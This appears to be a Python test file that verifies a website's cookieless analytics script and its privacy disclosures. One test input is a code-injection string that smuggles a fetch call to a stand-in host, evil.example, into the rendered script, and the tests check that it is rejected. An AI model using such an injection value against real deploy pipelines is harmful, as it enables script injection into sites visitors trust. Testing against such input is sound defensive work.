"""The site-measurement contract, held from the script side (ADR 0055).

``check_site_seo.py`` holds the page side on the assembled site: exactly one
``/src/measure.js`` on every page, none on a redirect stub, one destination
host, and nothing else naming a telemetry host. These tests hold what that gate
cannot see: the promises the script makes about itself, the promise
``/about/#privacy`` makes about the script, the two places the tag has to be
written (by ``_page`` and by ``sync_static_measure``), the one line a deploy
rewrites, and the marker that keeps a buyer's email out of any autocapture.
"""

from __future__ import annotations

import re
from html.parser import HTMLParser
from pathlib import Path

import pytest

from scorecard_pipeline.cli import main
from scorecard_pipeline.site_shell import (
    FOOTER_HTML,
    FOOTER_HTML_ES,
    MEASURE_HOST,
    MEASURE_SCRIPT_PATH,
    MEASURE_SCRIPT_TAG,
    MEASURED_STATIC_PAGES,
    STATIC_NAV_PAGES,
    _page,
    _redirect_page,
    ga4_measurement_id,
    measure_tag_count,
    render_measure_script,
    with_measure_tag,
    write_measure_script,
)

# The real repo, not the per-test tmp SCORECARD_ROOT conftest points at.
_REPO = Path(__file__).resolve().parents[2]
_WEB = _REPO / "web"
_SHIM = (_WEB / MEASURE_SCRIPT_PATH).read_text()
# The PostHog block: everything before the GA4 block (ADR 0056), which
# tests/test_measure_ga4.py holds. The promises below are PostHog's.
_POSTHOG = _SHIM[: _SHIM.index("// Google Analytics 4 (docs/decisions/0056")]
_ABOUT = (_WEB / "about" / "index.html").read_text()
_SETUP = (_WEB / "bundle" / "setup" / "index.html").read_text()
_BUNDLE_JS = (_WEB / "src" / "bundle.js").read_text()
_REPORT_GOLDENS = _REPO / "pipeline" / "tests" / "goldens" / "report"

_KEY = "phc_TestKey0123456789abcdefghijklmnopqrstuv"  # gitleaks:allow (fixture key, not real)
_PAGE_TYPES = ("home", "agency", "program", "bundle", "support", "fix", "directory", "other")


def _shell_page() -> str:
    return _page(
        title="A page",
        description="A description of a page long enough to be one.",
        canonical="https://gtfsscorecard.org/x/",
        body="<h1>A page</h1>",
    )


# --- where the tag is written ---------------------------------------------


def test_every_hand_authored_page_carries_the_tag_exactly_once() -> None:
    for rel in MEASURED_STATIC_PAGES:
        html = (_WEB / rel).read_text()
        assert measure_tag_count(html) == 1, f"{rel}: run `make sync-measure`"
        assert with_measure_tag(html) == html, f"{rel}: drifted; run `make sync-measure`"


def test_the_measured_static_set_is_the_nav_set_plus_the_two_landing_pages() -> None:
    """The landing pages carry their own header, so the nav sync never visits
    them; they still have to carry the tag, or the two most-landed-on pages
    would be the two the disclosure does not cover."""
    assert set(MEASURED_STATIC_PAGES) == set(STATIC_NAV_PAGES) | {"index.html", "es/index.html"}


def test_with_measure_tag_collapses_duplicates_and_needs_the_theme_anchor() -> None:
    page = '<head>\n  <script src="/src/theme.js" defer></script>\n</head>'
    once = with_measure_tag(page)
    assert measure_tag_count(once) == 1
    assert once.index("theme.js") < once.index("measure.js")
    twice = once.replace(MEASURE_SCRIPT_TAG, MEASURE_SCRIPT_TAG + "\n  " + MEASURE_SCRIPT_TAG)
    assert measure_tag_count(twice) == 2
    assert with_measure_tag(twice) == once
    with pytest.raises(ValueError, match=r"theme\.js"):
        with_measure_tag("<head></head>")


def test_generated_pages_carry_the_tag_once_and_redirect_stubs_never() -> None:
    assert measure_tag_count(_shell_page()) == 1
    assert measure_tag_count(_redirect_page("/gone/", "Gone")) == 0


def test_the_footer_on_every_page_links_the_disclosure() -> None:
    assert 'href="/about/#privacy"' in FOOTER_HTML
    assert 'href="/about/#privacy"' in FOOTER_HTML_ES
    assert 'id="privacy"' in _ABOUT


# --- the one line a deploy rewrites ----------------------------------------


def test_the_committed_shim_carries_no_key() -> None:
    assert re.search(r'^\s*var KEY = ""; // measure:key$', _SHIM, re.MULTILINE)
    assert "phc_" not in _SHIM


def test_render_writes_the_key_into_exactly_one_line_and_nothing_else() -> None:
    rendered = render_measure_script(_KEY, source=_SHIM)
    changed = [
        (before, after)
        for before, after in zip(_SHIM.splitlines(), rendered.splitlines(), strict=True)
        if before != after
    ]
    assert changed == [('  var KEY = ""; // measure:key', f'  var KEY = "{_KEY}"; // measure:key')]


def test_render_with_no_key_is_byte_identical_to_the_committed_shim() -> None:
    assert render_measure_script(None, source=_SHIM) == _SHIM
    assert render_measure_script("", source=_SHIM) == _SHIM
    assert render_measure_script("  ", source=_SHIM) == _SHIM


@pytest.mark.parametrize(
    "bad",
    ['phc_"; fetch("https://evil.example"); //', "not-a-key", "phc_short", "phc_has space"],
)
def test_render_refuses_anything_that_is_not_a_project_key(bad: str) -> None:
    with pytest.raises(ValueError, match="POSTHOG_KEY"):
        render_measure_script(bad, source=_SHIM)


def test_render_refuses_a_source_without_exactly_one_key_line() -> None:
    with pytest.raises(ValueError, match="exactly one"):
        render_measure_script(_KEY, source="var KEY = 1;\n")
    with pytest.raises(ValueError, match="exactly one"):
        render_measure_script(_KEY, source=_SHIM + _SHIM)


def test_write_measure_script_reports_whether_measurement_is_on(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("SCORECARD_ROOT", str(_REPO))
    out = tmp_path / "site" / "src" / "measure.js"
    assert write_measure_script(out, None) is False
    assert out.read_text() == _SHIM
    assert write_measure_script(out, _KEY) is True
    assert f'var KEY = "{_KEY}"; // measure:key' in out.read_text()


def test_render_measure_command_reads_the_key_from_the_environment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setenv("SCORECARD_ROOT", str(_REPO))
    out = tmp_path / "measure.js"
    # The GA4 id is whatever the repository's site-seo.json commits (ADR 0056);
    # this test is about the PostHog key, so it holds the rest of the file to
    # that render.
    ga4_id = ga4_measurement_id(_REPO / "site-seo.json")

    monkeypatch.delenv("POSTHOG_KEY", raising=False)
    assert main(["render-measure", "--out", str(out)]) == 0
    assert out.read_text() == render_measure_script(None, source=_SHIM, ga4_id=ga4_id)
    assert 'var KEY = ""; // measure:key' in out.read_text()
    assert "site measurement off" in capsys.readouterr().out

    monkeypatch.setenv("POSTHOG_KEY", _KEY)
    assert main(["render-measure", "--out", str(out)]) == 0
    assert _KEY in out.read_text()
    assert "site measurement on" in capsys.readouterr().out

    monkeypatch.setenv("POSTHOG_KEY", "nope")
    with pytest.raises(SystemExit) as failed:
        main(["render-measure", "--out", str(out)])
    assert failed.value.code == 2
    # A refused key never reaches the file: the last good render stands.
    assert _KEY in out.read_text()


# --- the promises the script makes about itself -----------------------------


def _code_only(source: str) -> str:
    """``source`` without its comments, which name the things the code must
    not do and would otherwise trip the very assertions that hold that."""
    without_blocks = re.sub(r"/\*.*?\*/", "", source, flags=re.DOTALL)
    return re.sub(r"^\s*//.*$", "", without_blocks, flags=re.MULTILINE)


def test_the_shim_sends_to_one_host_and_never_reads_what_it_promises_not_to() -> None:
    code = _code_only(_POSTHOG)
    hosts = {match.group(1) for match in re.finditer(r"https://([a-z0-9.-]+)", _POSTHOG)}
    assert hosts == {MEASURE_HOST.removeprefix("https://")}
    assert 'HOST + "/i/v0/e/"' in code
    assert "$process_person_profile: false" in code
    assert "globalPrivacyControl" in code
    assert "doNotTrack" in code
    assert "sessionStorage" in code
    for forbidden in (
        "localStorage",
        "document.cookie",
        "indexedDB",
        "FormData",
        ".value",
        "innerText",
        "textContent",
        "location.search",
        "location.hash",
        "location.href",
        "deliver_to",
        "posthog-js",
    ):
        assert forbidden not in code, forbidden
    # The referrer is read once, inside the helper that reduces it to a host.
    assert code.count("referrer") == 1
    assert "new URL(ref).hostname" in code


def test_the_shim_returns_before_sending_when_there_is_no_key() -> None:
    """The key check has to come before every other line of logic, so a deploy
    with no secret ships a file that does nothing rather than one that draws a
    visit id and then declines to send it."""
    logic = _code_only(_SHIM[_SHIM.index('"use strict";') :])
    assert logic.index("if (!KEY) return;") < logic.index("globalPrivacyControl")
    assert logic.index("if (!KEY) return;") < logic.index("sessionStorage")
    assert logic.index("if (!KEY) return;") < logic.index("fetch")


def test_the_shim_reports_only_controls_that_opt_in_by_name() -> None:
    assert 'closest("[data-measure]")' in _SHIM
    assert 'setAttribute("data-measure", "bundle_checkout_click")' in _BUNDLE_JS
    assert 'setAttribute("data-measure-plan", key)' in _BUNDLE_JS
    # Nothing else on the site opts in today; a new one is a disclosure change.
    marked = [
        path
        for path in sorted((_WEB / "src").glob("*.js"))
        if "data-measure" in path.read_text() and path.name != "measure.js"
    ]
    assert [path.name for path in marked] == ["bundle.js"]


def test_the_page_families_the_shim_sends_are_the_ones_the_disclosure_names() -> None:
    body = _SHIM[_SHIM.index("function pageType") : _SHIM.index("function referringDomain")]
    returned = set(re.findall(r'return "([a-z]+)"', body))
    assert returned == set(_PAGE_TYPES)
    privacy = _ABOUT[
        _ABOUT.index('id="privacy"') : _ABOUT.index("</section>", _ABOUT.index('id="privacy"'))
    ]
    for family in (
        "home",
        "agency",
        "program",
        "bundle",
        "support",
        "fix guide",
        "directory",
        "other",
    ):
        assert family in privacy, family


def test_the_disclosure_names_the_destination_the_retention_and_both_opt_outs() -> None:
    privacy = _ABOUT[
        _ABOUT.index('id="privacy"') : _ABOUT.index("</section>", _ABOUT.index('id="privacy"'))
    ]
    assert "PostHog Cloud US" in privacy
    assert MEASURE_HOST.removeprefix("https://") in privacy
    assert "one year" in privacy
    assert "Global Privacy" in privacy
    assert "Do Not Track" in privacy
    assert "PostHog sets no cookie" in privacy
    assert "session storage" in privacy
    assert "never the part of the address after a question mark" in privacy
    assert "web/src/measure.js" in privacy
    assert "0055-cookieless-site-measurement" in privacy


# --- the buyer's form and the buyer's document -----------------------------


class _Marked(HTMLParser):
    """Collect the class list of the setup form and of its email field."""

    def __init__(self) -> None:
        super().__init__()
        self.classes: dict[str, set[str]] = {}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        values = dict(attrs)
        if values.get("id") in {"setup-form", "deliver_to"}:
            self.classes[str(values["id"])] = set((values.get("class") or "").split())
            if values["id"] == "deliver_to":
                assert values.get("type") == "email"


def test_the_setup_form_and_its_email_field_are_marked_no_capture() -> None:
    """The shim never reads a form; this is the belt for the day an SDK is
    added, because ``ph-no-capture`` is what PostHog autocapture honours."""
    parser = _Marked()
    parser.feed(_SETUP)
    assert "ph-no-capture" in parser.classes["setup-form"]
    assert "ph-no-capture" in parser.classes["deliver_to"]


def test_the_board_report_a_buyer_receives_never_carries_the_script() -> None:
    """The self-contained report is a document, not a page on this site: it is
    emailed, attached to packets, and opened offline. It phones nowhere."""
    goldens = sorted(_REPORT_GOLDENS.glob("*.html"))
    assert goldens, "the report goldens are the evidence here"
    for path in goldens:
        text = path.read_text()
        assert "measure.js" not in text, path.name
        assert MEASURE_HOST not in text, path.name
    report_source = (_REPO / "pipeline" / "src" / "scorecard_pipeline" / "report.py").read_text()
    assert "MEASURE" not in report_source
    assert "_page" not in report_source
